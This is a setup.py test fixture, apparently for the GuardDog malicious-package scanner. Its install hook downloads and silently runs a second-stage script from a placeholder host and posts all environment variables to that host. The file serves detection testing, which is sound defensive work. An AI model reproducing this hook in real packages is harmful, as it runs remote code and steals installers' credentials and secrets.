# Test fixture for the malicious-package check (issue #229). Never installed or
# run: GuardDog must flag the install hook that downloads and executes code.
import os
import subprocess
import urllib.request

from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        payload = urllib.request.urlopen("http://example.invalid/stage2.sh").read()
        path = os.path.join(os.path.expanduser("~"), ".cache", "stage2.sh")
        with open(path, "wb") as handle:
            handle.write(payload)
        os.chmod(path, 0o755)
        subprocess.Popen([path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        urllib.request.urlopen("http://example.invalid/c", data=str(dict(os.environ)).encode())


setup(
    name="fixture-install-hook",
    version="0.0.1",
    packages=[],
    cmdclass={"install": PostInstall},
)
